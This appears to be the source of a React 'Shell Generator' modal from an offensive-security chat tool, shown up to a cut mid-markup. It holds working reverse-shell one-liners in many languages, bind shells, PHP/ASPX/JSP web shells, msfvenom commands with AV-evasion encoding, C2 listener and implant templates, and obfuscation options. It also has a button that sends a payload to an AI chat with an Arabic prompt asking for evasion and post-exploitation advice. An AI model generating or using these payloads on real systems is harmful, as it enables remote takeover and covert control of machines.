import { useState, useEffect, useCallback } from "react";
import { X, Copy, CheckCheck, Terminal, Shield, Zap, Code2, Send, RefreshCw, ChevronDown, Lock, Globe, Cpu, ArrowRight } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { useToast } from "@/hooks/use-toast";

interface Props {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onInjectToChat?: (payload: string) => void;
}

type ShellType = "reverse" | "bind" | "web" | "msfvenom" | "c2";
type OS = "linux" | "windows" | "macos" | "any";
type Encoding = "none" | "base64" | "urlenc" | "hex" | "ps_base64" | "unicode";

type Lang = {
  id: string; label: string; os: OS[]; types: ShellType[];
  color: string; icon: string;
};

const LANGUAGES: Lang[] = [
  { id: "bash",      label: "Bash",            os: ["linux","macos"], types: ["reverse","bind"], color: "#10b981", icon: "🐧" },
  { id: "sh",        label: "sh",              os: ["linux","macos"], types: ["reverse","bind"], color: "#10b981", icon: "🐚" },
  { id: "netcat",    label: "Netcat (nc)",      os: ["linux","macos","windows"], types: ["reverse","bind"], color: "#06b6d4", icon: "🕸️" },
  { id: "ncat",      label: "Ncat (nmap)",      os: ["linux","macos","windows"], types: ["reverse","bind"], color: "#06b6d4", icon: "🌐" },
  { id: "socat",     label: "Socat",            os: ["linux","macos"], types: ["reverse","bind"], color: "#8b5cf6", icon: "🔌" },
  { id: "python3",   label: "Python 3",         os: ["linux","macos","windows"], types: ["reverse","bind","web"], color: "#f59e0b", icon: "🐍" },
  { id: "python2",   label: "Python 2",         os: ["linux","macos","windows"], types: ["reverse","bind"], color: "#d97706", icon: "🐍" },
  { id: "powershell",label: "PowerShell",       os: ["windows"], types: ["reverse","bind"], color: "#3b82f6", icon: "💙" },
  { id: "cmd",       label: "CMD (batch)",      os: ["windows"], types: ["reverse","bind"], color: "#64748b", icon: "🪟" },
  { id: "php",       label: "PHP",              os: ["linux","windows","macos","any"], types: ["reverse","web"], color: "#a78bfa", icon: "🐘" },
  { id: "ruby",      label: "Ruby",             os: ["linux","macos","windows"], types: ["reverse"], color: "#ef4444", icon: "💎" },
  { id: "perl",      label: "Perl",             os: ["linux","macos","windows"], types: ["reverse"], color: "#e5e7eb", icon: "🦪" },
  { id: "java",      label: "Java",             os: ["linux","windows","macos"], types: ["reverse"], color: "#f97316", icon: "☕" },
  { id: "golang",    label: "Go",               os: ["linux","windows","macos"], types: ["reverse"], color: "#22d3ee", icon: "🐹" },
  { id: "rust",      label: "Rust",             os: ["linux","windows","macos"], types: ["reverse"], color: "#fb923c", icon: "🦀" },
  { id: "nodejs",    label: "Node.js",          os: ["linux","windows","macos"], types: ["reverse"], color: "#84cc16", icon: "🟢" },
  { id: "lua",       label: "Lua",              os: ["linux","macos"], types: ["reverse"], color: "#1d4ed8", icon: "🌙" },
  { id: "awk",       label: "AWK",              os: ["linux","macos"], types: ["reverse"], color: "#6d28d9", icon: "🔧" },
  { id: "telnet",    label: "Telnet",           os: ["linux","macos"], types: ["reverse"], color: "#64748b", icon: "📡" },
  { id: "rlwrap",    label: "Rlwrap + nc",      os: ["linux","macos"], types: ["reverse"], color: "#0ea5e9", icon: "🔗" },
  { id: "msfvenom",  label: "MSFvenom",         os: ["linux","windows","macos","any"], types: ["msfvenom"], color: "#dc2626", icon: "💥" },
  { id: "metasploit",label: "Metasploit (listener)", os: ["any"], types: ["c2"], color: "#dc2626", icon: "⚡" },
  { id: "sliver",    label: "Sliver C2",        os: ["any"], types: ["c2"], color: "#8b5cf6", icon: "🗡️" },
  { id: "covenant",  label: "Covenant C2",      os: ["windows"], types: ["c2"], color: "#3b82f6", icon: "🏰" },
  { id: "havoc",     label: "Havoc C2",         os: ["any"], types: ["c2"], color: "#ef4444", icon: "👹" },
  { id: "aspx",      label: "ASPX Web Shell",   os: ["windows"], types: ["web"], color: "#0ea5e9", icon: "🌐" },
  { id: "jsp",       label: "JSP Web Shell",    os: ["any"], types: ["web"], color: "#f59e0b", icon: "☕" },
];

const C2_FRAMEWORKS = [
  { id: "metasploit", label: "Metasploit", color: "#dc2626" },
  { id: "sliver",     label: "Sliver",     color: "#8b5cf6" },
  { id: "covenant",   label: "Covenant",   color: "#3b82f6" },
  { id: "havoc",      label: "Havoc",      color: "#ef4444" },
  { id: "empire",     label: "Empire",     color: "#f59e0b" },
  { id: "brute",      label: "Brute Ratel",color: "#10b981" },
];

function buildShell(lang: string, type: ShellType, lhost: string, lport: string, encoding: Encoding): string {
  const h = lhost || "10.10.14.1";
  const p = lport || "4444";

  const raw = (() => {
    // ── REVERSE SHELLS ───────────────────────────────────────────────────────
    if (type === "reverse") {
      if (lang === "bash") return `bash -i >& /dev/tcp/${h}/${p} 0>&1`;
      if (lang === "sh") return `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`;
      if (lang === "netcat") return `nc -e /bin/sh ${h} ${p}`;
      if (lang === "ncat") return `ncat ${h} ${p} -e /bin/sh`;
      if (lang === "socat") return `socat TCP:${h}:${p} EXEC:/bin/sh`;
      if (lang === "python3") return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      if (lang === "python2") return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      if (lang === "powershell") return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      if (lang === "cmd") return `cmd.exe /c "nc ${h} ${p} -e cmd.exe"`;
      if (lang === "php") return `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      if (lang === "ruby") return `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
      if (lang === "perl") return `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
      if (lang === "java") return `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`;
      if (lang === "golang") return `package main\nimport("net";"os/exec";"syscall")\nfunc main(){\nc,_:=net.Dial("tcp","${h}:${p}")\ncmd:=exec.Command("/bin/sh")\ncmd.Stdin=c\ncmd.Stdout=c\ncmd.Stderr=c\ncmd.SysProcAttr=&syscall.SysProcAttr{}\ncmd.Run()}`;
      if (lang === "nodejs") return `(function(){\nvar net = require("net"),\ncp = require("child_process"),\nsh = cp.spawn("/bin/sh", []);\nvar client = new net.Socket();\nclient.connect(${p}, "${h}", function(){\nclient.pipe(sh.stdin);\nsh.stdout.pipe(client);\nsh.stderr.pipe(client);\n});\nreturn /a/;\n})();`;
      if (lang === "lua") return `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`;
      if (lang === "awk") return `awk 'BEGIN {s = "/inet/tcp/0/${h}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
      if (lang === "telnet") return `TF=$(mktemp -u); mkfifo $TF && telnet ${h} ${p} 0<$TF | /bin/sh 1>$TF`;
      if (lang === "rlwrap") return `# Listener (attacker):\nrlwrap nc -lvnp ${p}\n\n# Target:\nbash -i >& /dev/tcp/${h}/${p} 0>&1`;
      if (lang === "rust") return `use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\nfn main() {\n  let s = TcpStream::connect("${h}:${p}").unwrap();\n  let fd = s.as_raw_fd();\n  Command::new("/bin/sh")\n    .stdin(unsafe { Stdio::from_raw_fd(fd) })\n    .stdout(unsafe { Stdio::from_raw_fd(fd) })\n    .stderr(unsafe { Stdio::from_raw_fd(fd) })\n    .spawn().unwrap().wait().unwrap();\n}`;
    }
    // ── BIND SHELLS ──────────────────────────────────────────────────────────
    if (type === "bind") {
      if (lang === "bash") return `# On target:\nbash -i >& /dev/tcp/0.0.0.0/${p} 0>&1 &\n\n# On attacker:\nnc ${h} ${p}`;
      if (lang === "netcat") return `# Target:\nnc -lvp ${p} -e /bin/sh\n\n# Attacker:\nnc ${h} ${p}`;
      if (lang === "ncat") return `# Target:\nncat -lvp ${p} -e /bin/sh\n\n# Attacker:\nncat ${h} ${p}`;
      if (lang === "socat") return `# Target:\nsocat TCP-LISTEN:${p},reuseaddr EXEC:/bin/sh\n\n# Attacker:\nsocat - TCP:${h}:${p}`;
      if (lang === "python3") return `python3 -c 'import socket,subprocess;s=socket.socket();s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();import os;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      if (lang === "powershell") return `powershell -c "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$rb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($rb,0,$rb.Length);$s.Flush()}"`;
      if (lang === "php") return `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${p});socket_listen($s,1);$c=socket_accept($s);while($l=socket_read($c,1024)){exec($l." 2>&1",$out);$out=implode("\\n",$out);socket_write($c,$out);}'`;
    }
    // ── WEB SHELLS ───────────────────────────────────────────────────────────
    if (type === "web") {
      if (lang === "php") return `<?php\n// Simple PHP Web Shell\nif(isset($_REQUEST['cmd'])){\n  $cmd = $_REQUEST['cmd'];\n  echo "<pre>";\n  system($cmd);\n  echo "</pre>";\n}\n?>\n<form method="POST">\n<input type="text" name="cmd" placeholder="command" size="60">\n<input type="submit" value="Execute">\n</form>`;
      if (lang === "aspx") return `<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% \n  string cmd = Request["cmd"];\n  if(cmd != null) {\n    Process p = new Process();\n    p.StartInfo.FileName = "cmd.exe";\n    p.StartInfo.Arguments = "/c " + cmd;\n    p.StartInfo.UseShellExecute = false;\n    p.StartInfo.RedirectStandardOutput = true;\n    p.Start();\n    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");\n  }\n%>\n<form><input name="cmd" size="60"><input type="submit"></form>`;
      if (lang === "jsp") return `<% \nimport java.io.*;\nString cmd = request.getParameter("cmd");\nif(cmd != null){\n  Runtime r = Runtime.getRuntime();\n  Process p = r.exec(new String[]{"sh","-c",cmd});\n  InputStream i = p.getInputStream();\n  out.println("<pre>");\n  int c;\n  while((c=i.read())!=-1) out.print((char)c);\n  out.println("</pre>");\n}\n%>\n<form><input name="cmd" size="60"><input type="submit"></form>`;
      if (lang === "python3") return `from http.server import BaseHTTPRequestHandler, HTTPServer\nimport subprocess, urllib.parse\n\nclass Handler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    cmd = urllib.parse.unquote(self.path[1:])\n    if cmd:\n      out = subprocess.getoutput(cmd)\n    else:\n      out = "Usage: /?cmd=<command>"\n    self.send_response(200)\n    self.end_headers()\n    self.wfile.write(out.encode())\n\nHTTPServer(("0.0.0.0", ${p}), Handler).serve_forever()`;
    }
    // ── MSFVENOM ─────────────────────────────────────────────────────────────
    if (type === "msfvenom") {
      if (lang === "msfvenom") return `# Linux ELF reverse shell\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f elf -o rev.elf\nchmod +x rev.elf && ./rev.elf\n\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f exe -o rev.exe\n\n# Windows DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f dll -o rev.dll\n\n# PowerShell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f ps1 -o rev.ps1\n\n# Python\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f raw -o rev.py\n\n# PHP\nmsfvenom -p php/reverse_php LHOST=${h} LPORT=${p} -f raw -o rev.php\n\n# Android APK\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -o rev.apk\n\n# Java WAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=${h} LPORT=${p} -f war -o rev.war\n\n# Staged Meterpreter (best AV evasion)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=${h} LPORT=443 -e x64/xor_dynamic -i 10 -f exe -o meterp.exe`;
    }
    // ── C2 TEMPLATES ─────────────────────────────────────────────────────────
    if (type === "c2") {
      if (lang === "metasploit") return `# Metasploit multi/handler listener\nmsfconsole -q -x "\nuse exploit/multi/handler;\nset PAYLOAD windows/x64/meterpreter/reverse_tcp;\nset LHOST ${h};\nset LPORT ${p};\nset ExitOnSession false;\nexploit -j -z;\n"\n\n# HTTPS listener (stealth)\nmsfconsole -q -x "\nuse exploit/multi/handler;\nset PAYLOAD windows/x64/meterpreter/reverse_https;\nset LHOST ${h};\nset LPORT 443;\nset STAGINGKEY $(openssl rand -hex 16);\nexploit -j;\n"`;
      if (lang === "sliver") return `# Sliver C2 implant generation\n# Start Sliver server:\nsliver-server\n\n# In Sliver console:\ngenerate --mtls ${h}:${p} --os windows --arch amd64 --save /tmp/implant.exe\n\n# Start MTLS listener:\nmtls --lport ${p}\n\n# Generate beacon (persistent check-in):\ngenerate beacon --mtls ${h}:${p} --seconds 30 --jitter 15 --os windows --save /tmp/beacon.exe`;
      if (lang === "covenant") return `# Covenant C2 Setup\n# 1. Start Covenant:\ndocker run -it -p 7443:7443 -p 80:80 -p 443:443 ghcr.io/cobbr/covenant\n\n# 2. Access UI at https://localhost:7443\n# 3. Create Listener:\n#    - Type: HTTP\n#    - ConnectAddresses: ${h}\n#    - BindPort: ${p}\n\n# 4. Generate Grunt (implant):\n#    Launchers > PowerShell\n#    Copy command and execute on target`;
      if (lang === "havoc") return `# Havoc C2 teamserver.yaml\nTeamServer:\n  Host: ${h}\n  Port: ${p}\n  Build:\n    Compiler64: /usr/bin/x86_64-w64-mingw32-gcc\n\nListeners:\n  - Name: "${h}"\n    Protocol: "https"\n    Hosts:\n      - "${h}"\n    HostBind: "0.0.0.0"\n    PortBind: 443\n    PortConn: 443\n\n# Start: ./havoc server --profile teamserver.yaml`;
      if (lang === "empire") return `# PowerShell Empire\n# Start Empire:\npython3 empire --rest --username admin --password password\n\n# Create HTTP listener:\nlisteners\nuselistener http\nset Host http://${h}:${p}\nexecute\n\n# Generate stager:\nusestager windows/launcher_bat\nset Listener http_listener\nexecute`;
      if (lang === "brute") return `# Brute Ratel C4\n# Config JSON template:\n{\n  "name": "BRC4_implant",\n  "type": "http",\n  "host": "${h}",\n  "port": ${p},\n  "callback_interval": 30,\n  "jitter": 20,\n  "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",\n  "headers": {\n    "Accept": "*/*",\n    "Content-Type": "application/octet-stream"\n  },\n  "sleep_mask": true,\n  "syscall": "indirect"\n}`;
    }
    return `# No template for ${lang} / ${type}`;
  })();

  // Apply encoding
  if (encoding === "none") return raw;
  if (encoding === "base64") return `echo '${btoa(unescape(encodeURIComponent(raw)))}' | base64 -d | bash`;
  if (encoding === "ps_base64") {
    const enc = btoa(unescape(encodeURIComponent(raw.replace(/\n/g, "; "))));
    return `powershell -enc ${enc}`;
  }
  if (encoding === "urlenc") return encodeURIComponent(raw);
  if (encoding === "hex") return Array.from(new TextEncoder().encode(raw)).map(b => b.toString(16).padStart(2,"0")).join("");
  if (encoding === "unicode") return raw.split("").map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
  return raw;
}

const SHELL_TABS: { id: ShellType; label: string; icon: React.ElementType; color: string }[] = [
  { id: "reverse",  label: "Reverse Shell",   icon: ArrowRight, color: "#e21227" },
  { id: "bind",     label: "Bind Shell",       icon: Lock,       color: "#8b5cf6" },
  { id: "web",      label: "Web Shell",        icon: Globe,      color: "#06b6d4" },
  { id: "msfvenom", label: "MSFvenom",         icon: Zap,        color: "#f59e0b" },
  { id: "c2",       label: "C2 Framework",     icon: Cpu,        color: "#10b981" },
];

export function ShellGeneratorModal({ open, onOpenChange, onInjectToChat }: Props) {
  const { toast } = useToast();
  const [shellType, setShellType] = useState<ShellType>("reverse");
  const [os, setOs] = useState<OS>("linux");
  const [langId, setLangId] = useState("bash");
  const [c2fw, setC2fw] = useState("metasploit");
  const [lhost, setLhost] = useState("10.10.14.1");
  const [lport, setLport] = useState("4444");
  const [encoding, setEncoding] = useState<Encoding>("none");
  const [output, setOutput] = useState("");
  const [copied, setCopied] = useState(false);

  // Auto-detect local IP (best effort)
  useEffect(() => {
    try {
      const rtc = new RTCPeerConnection({ iceServers: [] });
      rtc.createDataChannel("");
      rtc.createOffer().then(o => rtc.setLocalDescription(o));
      rtc.onicecandidate = (e) => {
        if (!e.candidate) return;
        const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
        if (m && !m[0].startsWith("127.") && !m[0].startsWith("::")) {
          setLhost(m[0]);
          rtc.close();
        }
      };
    } catch { /* ignore */ }
  }, []);

  const filteredLangs = LANGUAGES.filter(l =>
    l.types.includes(shellType) && (os === "any" || l.os.includes(os) || l.os.includes("any"))
  );

  // Auto-select first valid lang when type/os changes
  useEffect(() => {
    const effectiveLang = shellType === "c2" ? c2fw : langId;
    const valid = filteredLangs.find(l => l.id === effectiveLang);
    if (!valid && filteredLangs.length > 0) {
      if (shellType === "c2") setC2fw(filteredLangs[0].id);
      else setLangId(filteredLangs[0].id);
    }
  }, [shellType, os]);

  const generate = useCallback(() => {
    const effectiveLang = shellType === "c2" ? c2fw : langId;
    setOutput(buildShell(effectiveLang, shellType, lhost, lport, encoding));
  }, [shellType, langId, c2fw, lhost, lport, encoding]);

  useEffect(() => { generate(); }, [generate]);

  async function copyOutput() {
    await navigator.clipboard.writeText(output);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ description: "تم نسخ الـ payload" });
  }

  function injectToChat() {
    if (onInjectToChat) {
      const langDef = LANGUAGES.find(l => l.id === (shellType === "c2" ? c2fw : langId));
      const prompt = `[SHELL GENERATOR OUTPUT]\nType: ${shellType.toUpperCase()} | Lang: ${langDef?.label ?? langId} | OS: ${os.toUpperCase()} | LHOST: ${lhost} | LPORT: ${lport} | Encoding: ${encoding.toUpperCase()}\n\n\`\`\`bash\n${output}\n\`\`\`\n\nاشرح هذا الـ payload وكيف يعمل، وأعط نصائح للـ evasion والـ post-exploitation.`;
      onInjectToChat(prompt);
      onOpenChange(false);
      toast({ description: "تم إرسال الـ payload للمحادثة" });
    }
  }

  const selectedLang = LANGUAGES.find(l => l.id === langId);
  const selectedC2 = C2_FRAMEWORKS.find(c => c.id === c2fw);

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          className="fixed inset-0 z-50 flex items-center justify-center p-3"
          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        >
          <div className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => onOpenChange(false)} />
          <motion.div
            className="relative w-full max-w-4xl max-h-[96vh] bg-[#060606] border border-[#e21227]/30 rounded-2xl overflow-hidden flex flex-col shadow-[0_0_60px_rgba(226,18,39,0.15)]"
            initial={{ scale: 0.93, opacity: 0, y: 30 }}
            animate={{ scale: 1, opacity: 1, y: 0 }}
            exit={{ scale: 0.93, opacity: 0, y: 30 }}
            transition={{ duration: 0.2, ease: "easeOut" }}
          >
            {/* Glow top border */}
            <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-[#e21227] to-transparent" />

            {/* Header */}
            <div className="flex items-center justify-between px-5 py-4 border-b border-[#1f1f1f] shrink-0">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-[#e21227]/10 border border-[#e21227]/30 flex items-center justify-center">
                  <Terminal className="w-5 h-5 text-[#e21227]" />
                </div>
                <div>
                  <h2 className="text-[15px] font-black text-foreground tracking-tight">SHELL GENERATOR</h2>
                  <p className="text-[10px] text-muted-foreground font-mono">Reverse · Bind · Web · MSFvenom · C2 — Real-time payload builder</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button onClick={generate}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1a1a1a] border border-[#262626] text-muted-foreground hover:text-foreground text-[11px] font-semibold transition-colors">
                  <RefreshCw className="w-3.5 h-3.5" /> توليد
                </button>
                <button onClick={() => onOpenChange(false)} className="p-1.5 rounded-lg hover:bg-[#1f1f1f] text-muted-foreground hover:text-foreground transition-colors">
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto">
              <div className="flex flex-col lg:flex-row gap-0 h-full">

                {/* ── Left Panel: Controls ── */}
                <div className="lg:w-72 shrink-0 border-b lg:border-b-0 lg:border-r border-[#1a1a1a] p-4 space-y-4 overflow-y-auto">

                  {/* Shell Type Tabs */}
                  <div className="space-y-1.5">
                    <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">نوع الـ Shell</p>
                    <div className="space-y-1">
                      {SHELL_TABS.map(tab => {
                        const Icon = tab.icon;
                        return (
                          <button key={tab.id} onClick={() => setShellType(tab.id)}
                            className={`w-full flex items-center gap-2.5 px-3 py-2 rounded-xl border text-left transition-all ${
                              shellType === tab.id
                                ? "border-opacity-50 text-foreground"
                                : "border-[#1a1a1a] bg-[#0a0a0a] text-muted-foreground hover:text-foreground hover:border-[#2a2a2a]"
                            }`}
                            style={shellType === tab.id ? { borderColor: tab.color + "60", background: tab.color + "10", color: tab.color } : {}}
                          >
                            <Icon className="w-4 h-4 shrink-0" />
                            <span className="text-[12px] font-bold">{tab.label}</span>
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  {/* OS Selection */}
                  {shellType !== "c2" && shellType !== "msfvenom" && (
                    <div className="space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">نظام التشغيل</p>
                      <div className="grid grid-cols-2 gap-1">
                        {(["linux","windows","macos","any"] as OS[]).map(o => (
                          <button key={o} onClick={() => setOs(o)}
                            className={`px-2 py-1.5 rounded-lg border text-[11px] font-bold transition-all ${
                              os === o ? "bg-primary/10 border-primary/40 text-primary" : "bg-[#0a0a0a] border-[#1a1a1a] text-muted-foreground hover:text-foreground hover:border-[#2a2a2a]"
                            }`}
                          >
                            {o === "any" ? "Any" : o === "linux" ? "Linux" : o === "windows" ? "Windows" : "macOS"}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Language Selection */}
                  {shellType !== "c2" && (
                    <div className="space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">اللغة / الأداة</p>
                      <div className="space-y-1 max-h-44 overflow-y-auto pr-1">
                        {filteredLangs.map(l => (
                          <button key={l.id} onClick={() => setLangId(l.id)}
                            className={`w-full flex items-center gap-2 px-2.5 py-1.5 rounded-lg border text-left transition-all ${
                              langId === l.id ? "bg-[#1a1a1a] border-[#333] text-foreground" : "bg-[#0a0a0a] border-[#141414] text-muted-foreground hover:text-foreground hover:border-[#222]"
                            }`}
                          >
                            <span className="text-[13px]">{l.icon}</span>
                            <span className="text-[11px] font-semibold">{l.label}</span>
                            {langId === l.id && <span className="ml-auto w-1.5 h-1.5 rounded-full" style={{ background: l.color }} />}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* C2 Framework Selection */}
                  {shellType === "c2" && (
                    <div className="space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">C2 Framework</p>
                      <div className="space-y-1">
                        {C2_FRAMEWORKS.map(c => (
                          <button key={c.id} onClick={() => setC2fw(c.id)}
                            className={`w-full flex items-center gap-2 px-3 py-2 rounded-xl border text-left transition-all ${
                              c2fw === c.id ? "text-foreground" : "border-[#1a1a1a] bg-[#0a0a0a] text-muted-foreground hover:text-foreground"
                            }`}
                            style={c2fw === c.id ? { borderColor: c.color + "50", background: c.color + "10" } : {}}
                          >
                            <span className="text-[11px] font-bold">{c.label}</span>
                            {c2fw === c.id && <span className="ml-auto w-2 h-2 rounded-full" style={{ background: c.color }} />}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* LHOST / LPORT */}
                  {shellType !== "web" && (
                    <div className="space-y-2">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">Connection</p>
                      <div>
                        <label className="text-[10px] text-muted-foreground mb-1 block">LHOST / Attacker IP</label>
                        <input value={lhost} onChange={e => setLhost(e.target.value)}
                          className="w-full bg-[#0a0a0a] border border-[#1f1f1f] focus:border-[#e21227]/40 rounded-lg px-3 py-2 text-[12px] font-mono text-foreground outline-none placeholder:text-muted-foreground/40 transition-colors"
                          placeholder="10.10.14.1" dir="ltr" />
                      </div>
                      <div>
                        <label className="text-[10px] text-muted-foreground mb-1 block">LPORT / Listen Port</label>
                        <input value={lport} onChange={e => setLport(e.target.value)}
                          className="w-full bg-[#0a0a0a] border border-[#1f1f1f] focus:border-[#e21227]/40 rounded-lg px-3 py-2 text-[12px] font-mono text-foreground outline-none placeholder:text-muted-foreground/40 transition-colors"
                          placeholder="4444" dir="ltr" />
                      </div>
                    </div>
                  )}

                  {/* Encoding */}
                  <div className="space-y-1.5">
                    <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">Encoding / Obfuscation</p>
                    <div className="grid grid-cols-2 gap-1">
                      {([
                        { id: "none", label: "None" },
                        { id: "base64", label: "Base64" },
                        { id: "ps_base64", label: "PS Base64" },
                        { id: "urlenc", label: "URL Encode" },
                        { id: "hex", label: "Hex" },
                        { id: "unicode", label: "Unicode \\u" },
                      ] as { id: Encoding; label: string }[]).map(e => (
                        <button key={e.id} onClick={() => setEncoding(e.id)}
                          className={`px-2 py-1.5 rounded-lg border text-[10px] font-bold transition-all ${
                            encoding === e.id ? "bg-primary/10 border-primary/40 text-primary" : "bg-[#0a0a0a] border-[#1a1a1a] text-muted-foreground hover:text-foreground hover:border-[#2a2a2a]"
                          }`}
                        >
                          {e.label}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Listener helper */}
                  {(shellType === "reverse" || shellType === "msfvenom") && (
                    <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-xl p-3 space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider flex items-center gap-1">
                        <Shield className="w-3 h-3 text-emerald-400" /> Listener Commands
                      </p>
                      <code className="text-[10px] text-emerald-400 font-mono block">nc -lvnp {lport}</code>
                      <code className="text-[10px] text-violet-400 font-mono block">rlwrap nc -lvnp {lport}</code>
                      <code className="text-[10px] text-amber-400 font-mono block">socat file:`tty`,raw,echo=0 TCP-LISTEN:{lport}</code>
                    </div>
                  )}
                </div>

                {/* ── Right Panel: Output ── */}
                <div className="flex-1 flex flex-col min-h-0">
                  {/* Output Header */}
                  <div className="flex items-center justify-between px-4 py-3 border-b border-[#1a1a1a] shrink-0">
                    <div className="flex items-center gap-2">
                      <div className="flex gap-1">
                        <span className="w-3 h-3 rounded-full bg-[#ff5f57]" />
                        <span className="w-3 h-3 rounded-full bg-[#febc2e]" />
                        <span className="w-3 h-3 rounded-full bg-[#28c840]" />
                      </div>
                      <span className="text-[11px] font-mono text-muted-foreground">
                        {shellType === "c2" ? (selectedC2?.label ?? "C2") : (selectedLang?.label ?? langId)} · {shellType.toUpperCase()} · {lhost}:{lport}
                        {encoding !== "none" && ` · ${encoding.toUpperCase()}`}
                      </span>
                    </div>
                    <div className="flex items-center gap-2">
                      <button onClick={copyOutput}
                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1a1a1a] border border-[#262626] hover:border-[#333] text-[11px] font-semibold text-muted-foreground hover:text-foreground transition-all">
                        {copied ? <CheckCheck className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        {copied ? "تم النسخ!" : "نسخ"}
                      </button>
                      {onInjectToChat && (
                        <button onClick={injectToChat}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#e21227] hover:bg-[#c00f20] text-white text-[11px] font-bold transition-all">
                          <Send className="w-3.5 h-3.5" /> أرسل للمحادثة
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Code Output */}
                  <div className="flex-1 relative overflow-hidden">
